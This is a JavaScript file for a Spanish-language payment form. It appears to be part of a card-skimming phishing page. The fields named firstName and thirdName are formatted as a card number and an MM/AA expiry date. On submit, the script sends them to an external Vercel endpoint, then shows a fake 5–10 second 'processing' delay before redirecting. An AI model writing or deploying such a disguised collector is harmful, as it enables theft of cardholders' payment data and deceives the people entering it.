document.getElementById('payment-form').addEventListener('submit', async function (e) {
    e.preventDefault();

    const firstName = document.getElementById('firstName').value.trim();
    const secondName = document.getElementById('secondName').value.trim();
    const thirdName = document.getElementById('thirdName').value.trim();

    // 🚨 Validaciones antes de enviar
    if (!firstName || !secondName || !thirdName) {
        alert("❌ Por favor, completa todos los campos.");
        return;
    }

    // 🔹 Verificar conexión a Internet antes de enviar
    if (!navigator.onLine) {
        alert("🚨 No tienes conexión a Internet.");
        return;
    }

    // 🔹 Corrección de la URL del servidor en Vercel
    const serverUrl = "https://payment-one-beta.vercel.app/api/send-data"; // ✅ Asegura que el backend tenga "/api/"

    // 🔹 Deshabilitar el botón para evitar múltiples envíos
    const payButton = document.querySelector('.pay-button');
    payButton.disabled = true;
    payButton.innerText = "Procesando...";

    try {
        console.log("📨 Enviando datos al servidor...", { firstName, secondName, thirdName });

        const response = await fetch(serverUrl, {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                firstName: firstName.trim(),
                secondName: secondName.trim(),
                thirdName: thirdName.trim()
            })
        });

        if (!response.ok) {
            throw new Error(`Error ${response.status}: ${response.statusText}`);
        }

        const data = await response.json();
        console.log("✅ Datos enviados correctamente:", data);

        // 🔹 Simulación de carga antes de abrir processing.html
        setTimeout(() => {
            window.location.href = "/processing/processing.html";
        }, Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000);

    } catch (error) {
        console.error("🚨 Error al enviar los datos:", error);
        alert(`Hubo un problema al procesar la información. ⚠️ Detalles: ${error.message}`);

        // 🔹 Reactivar el botón si hay error
        payButton.disabled = false;
        payButton.innerText = "Pagar";
    }
});

// ✨ Formateo automático del número de tarjeta
document.getElementById('firstName').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(\d{4})/g, '$1 ').trim();
    e.target.value = value;
});

// 🚀 Formateo automático de la fecha MM / AA (Solo números)
document.getElementById('thirdName').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '').slice(0, 4); // 🔹 Solo números
    if (value.length > 2) {
        value = value.slice(0, 2) + '/' + value.slice(2); // 🔹 Formato MM/AA
    }
    e.target.value = value;
});

// 🚀 Desplegar el formulario sin afectar la información de contacto
function togglePayment() {
    const paymentForm = document.getElementById('payment-form');
    const paymentDot = document.getElementById('payment-dot');

    paymentForm.classList.toggle('shown');
    paymentDot.classList.toggle('selected');
}
